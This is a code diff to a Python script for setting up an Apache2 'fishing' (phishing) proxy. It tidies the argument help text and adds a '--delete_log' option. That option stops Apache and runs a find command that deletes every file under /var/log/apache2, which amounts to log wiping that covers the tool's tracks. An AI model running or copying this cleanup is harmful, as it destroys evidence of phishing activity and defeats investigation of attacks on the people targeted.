@@ -120,7 +120,8 @@ if __name__ == "__main__":
     Base.check_enabled_modules()
 
     parser = ArgumentParser(description='Setup Apache2 fishing proxy')
-    parser.add_argument('-u', '--url', type=str, help='Set URL for proxy', default='http://test.com')
+    parser.add_argument('-u', '--url', type=str, help='Set URL for proxy (example: "http://test.com")',
+                        default='http://test.com')
     parser.add_argument('-C', '--country', type=str, help='Set Country for SSL cert (default: RU)',
                         default='RU')
     parser.add_argument('-S', '--state', type=str, help='Set State for SSL cert (default: Moscow)',
@@ -142,16 +143,23 @@ if __name__ == "__main__":
                         help='Set path to Apache2 https site config '
                              '(default: /etc/apache2/sites-available/default-ssl.conf)',
                         default='/etc/apache2/sites-available/default-ssl.conf')
-    parser.add_argument('-E', '--erase', action='store_true', help='Erase Apache2 config files')
+    parser.add_argument('-E', '--erase_conf', action='store_true', help='Erase Apache2 config files')
+    parser.add_argument('-D', '--delete_log', action='store_true', help='Delete Apache2 log files')
     args = parser.parse_args()
 
-    if args.erase:
+    if args.erase_conf:
         open(args.http_config, 'w').close()
         open(args.https_config, 'w').close()
         print Base.c_info + "Apache2 http sites config: " + args.http_config
         print Base.c_info + "Apache2 https sites config: " + args.https_config
         print Base.c_info + "Apache2 configuration files have been erased!"
         os.system("/etc/init.d/apache2 stop")
+        exit(0)
+
+    if args.delete_log:
+        os.system("/etc/init.d/apache2 stop")
+        os.system("find /var/log/apache2/ -type f -exec rm -f {} \;")
+        print Base.c_info + "Apache2 log files have been deleted!"
         exit(0)
 
     schema = "http"
